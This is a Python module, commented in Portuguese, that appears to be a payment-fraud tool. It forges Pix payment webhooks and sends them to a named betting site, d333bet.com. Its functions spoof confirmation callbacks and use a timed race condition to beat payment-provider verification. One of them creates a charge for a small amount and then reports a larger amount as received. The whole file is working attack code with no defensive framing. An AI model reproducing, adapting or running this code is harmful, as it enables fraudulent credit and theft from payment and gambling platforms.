from utils.txid_generator import generate_realistic_txid
from utils.webhook_spoofer import spoof_webhook_request
from utils.psp_bypass import simulate_psp_response
from modules.fake_pix_payloads import (
    payload_criacao_cobranca, payload_resposta_criacao_cobranca,
    payload_consulta_cobranca, payload_resposta_consulta_cobranca
)
import time
from config.config_loader import load_config
import requests

def executar_fake_pix_automatizado(pix_code, jwt_token, user_id, valor, endpoint, nome_recebedor):
    """Injeta webhook falso antes da verificação PSP"""
    # Gera TXID realístico
    txid = generate_realistic_txid()
    # Cria payload e headers spoofados
    payload, headers = spoof_webhook_request(
        pix_code, jwt_token, user_id, valor, endpoint, nome_recebedor, txid
    )
    # Enviar payload spoofado
    try:
        # Define URL final (adiciona domínio se necessário)
        url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
        response = requests.post(url_final, headers=headers, json=payload, timeout=6)
        log_result = f"[+] Webhook spoofed: {url_final} | Status: {response.status_code}\n"
    except Exception as e:
        log_result = f"[!] Erro no webhook spoof: {e}\n"
    # Log em arquivo
    import os
    os.makedirs('output', exist_ok=True)
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_result)
    return txid

def injetar_fakepix_com_bypass(jwt_token, user_id, valor, endpoint, nome_recebedor, txid, pix_code):
    """Injeta webhook fake e simula resposta do PSP via race condition"""
    from utils.webhook_spoofer import spoof_webhook_request

    # Monta payload e headers spoofados
    payload, headers = spoof_webhook_request(pix_code, jwt_token, user_id, valor, endpoint, nome_recebedor, txid)

    # 1. Envia webhook fake antecipado
    try:
        url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
        requests.post(url_final, headers=headers, json=payload, timeout=3)
    except:
        pass

    # 2. Delay estratégico (race condition)
    delay = load_config().get('psp_spoof_settings', {}).get('default_delay_ms', 400) / 1000.0
    time.sleep(delay)

    # 3. Simula resposta do PSP
    status, result = simulate_psp_response(jwt_token, endpoint, valor, txid, nome_recebedor)

    # Log no mesmo arquivo de fake_pix_logs
    import os
    os.makedirs('output', exist_ok=True)
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(f"[+] Injeção com bypass PSP: {status} | TXID: {txid} | Resposta: {result}\n")

    return status, result 

# --- NOVAS FUNÇÕES DE INJEÇÃO DE PAYLOADS PIX ---
def enviar_criacao_cobranca(valor, chave_pix, endpoint, headers=None, info_adicional=None):
    """Envia payload de criação de cobrança (Charge Creation Request)"""
    payload = payload_criacao_cobranca(valor, chave_pix, info_adicional)
    headers = headers or {"Content-Type": "application/json"}
    url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
    try:
        response = requests.post(url_final, json=payload, headers=headers, timeout=6)
        log_result = f"[+] Payload criação cobrança enviado: {url_final} | Status: {response.status_code}\n"
    except Exception as e:
        log_result = f"[!] Erro ao enviar criação cobrança: {e}\n"
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_result)
    return payload


def manipular_valor_entrada_saida_pix(valor_entrada, valor_saida, chave_pix, endpoint_criacao, endpoint_webhook, txid=None, info_adicional=None, headers=None):
    """
    Simula cenário onde o código Pix é para valor_entrada, mas o recebedor recebe valor_saida.
    - valor_entrada: valor do Pix gerado (ex: R$10)
    - valor_saida: valor recebido pelo recebedor (ex: R$50)
    - endpoint_criacao: endpoint para criar a cobrança (gerar QR Code)
    - endpoint_webhook: endpoint para enviar o webhook/callback de recebimento
    - txid: opcional, para rastreio
    """
    from modules.fake_pix_payloads import payload_criacao_cobranca, payload_resposta_criacao_cobranca
    import uuid
    import datetime
    headers = headers or {"Content-Type": "application/json"}
    # 1. Cria cobrança (valor do QR code é valor_entrada)
    if not txid:
        txid = str(uuid.uuid4())[:32]
    payload_qr = payload_criacao_cobranca(valor_entrada, chave_pix, info_adicional, txid=txid)
    url_criacao = endpoint_criacao if endpoint_criacao.startswith('http') else f"https://d333bet.com{endpoint_criacao}"
    try:
        resp_criacao = requests.post(url_criacao, json=payload_qr, headers=headers, timeout=6)
        log1 = f"[+] QR Pix criado: {url_criacao} | Valor: {valor_entrada:.2f} | TXID: {txid} | Status: {resp_criacao.status_code}\n"
    except Exception as e:
        log1 = f"[!] Erro ao criar QR Pix: {e}\n"
    # 2. Envia webhook/callback de recebimento (valor manipulado = valor_saida)
    location = str(uuid.uuid4())[:8]
    qr_code = f"FAKEQRCODE_{txid}"  # pode customizar conforme necessário
    payload_recebido = payload_resposta_criacao_cobranca(
        txid, location, qr_code, status="CONCLUIDA", expiracao=datetime.datetime.now().isoformat(),
        pagador=None
    )
    # Manipula o valor recebido no payload de resposta
    payload_recebido["valor"]["original"] = f"{valor_saida:.2f}"
    url_webhook = endpoint_webhook if endpoint_webhook.startswith('http') else f"https://d333bet.com{endpoint_webhook}"
    try:
        resp_webhook = requests.post(url_webhook, json=payload_recebido, headers=headers, timeout=6)
        log2 = f"[+] Webhook Pix manipulado enviado: {url_webhook} | Valor recebido: {valor_saida:.2f} | Status: {resp_webhook.status_code}\n"
    except Exception as e:
        log2 = f"[!] Erro ao enviar webhook manipulado: {e}\n"
    # Log detalhado
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log1)
        f.write(log2)
    return {
        "txid": txid,
        "valor_entrada": valor_entrada,
        "valor_saida": valor_saida,
        "payload_qr": payload_qr,
        "payload_recebido": payload_recebido
    }

def enviar_resposta_criacao_cobranca(txid, location, qr_code, endpoint, headers=None, status="ATIVA", expiracao="2025-12-31T23:59:59Z"):
    """Envia payload de resposta de criação de cobrança (Charge Creation Response)"""
    payload = payload_resposta_criacao_cobranca(txid, location, qr_code, status, expiracao)
    headers = headers or {"Content-Type": "application/json"}
    url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
    try:
        response = requests.post(url_final, json=payload, headers=headers, timeout=6)
        log_result = f"[+] Payload resposta criação cobrança enviado: {url_final} | Status: {response.status_code}\n"
    except Exception as e:
        log_result = f"[!] Erro ao enviar resposta criação cobrança: {e}\n"
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_result)
    return payload

def enviar_consulta_cobranca(txid, endpoint, headers=None, chave_pix=None):
    """Envia payload de consulta de cobrança (Charge Inquiry Request)"""
    payload = payload_consulta_cobranca(txid, chave_pix)
    headers = headers or {"Content-Type": "application/json"}
    url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
    try:
        response = requests.post(url_final, json=payload, headers=headers, timeout=6)
        log_result = f"[+] Payload consulta cobrança enviado: {url_final} | Status: {response.status_code}\n"
    except Exception as e:
        log_result = f"[!] Erro ao enviar consulta cobrança: {e}\n"
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_result)
    return payload

def enviar_resposta_consulta_cobranca(txid, status, valor, endpoint, headers=None, pagador=None):
    """Envia payload de resposta de consulta de cobrança (Charge Inquiry Response)"""
    payload = payload_resposta_consulta_cobranca(txid, status, valor, pagador)
    headers = headers or {"Content-Type": "application/json"}
    url_final = endpoint if endpoint.startswith('http') else f"https://d333bet.com{endpoint}"
    try:
        response = requests.post(url_final, json=payload, headers=headers, timeout=6)
        log_result = f"[+] Payload resposta consulta cobrança enviado: {url_final} | Status: {response.status_code}\n"
    except Exception as e:
        log_result = f"[!] Erro ao enviar resposta consulta cobrança: {e}\n"
    with open('output/fake_pix_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_result)
    return payload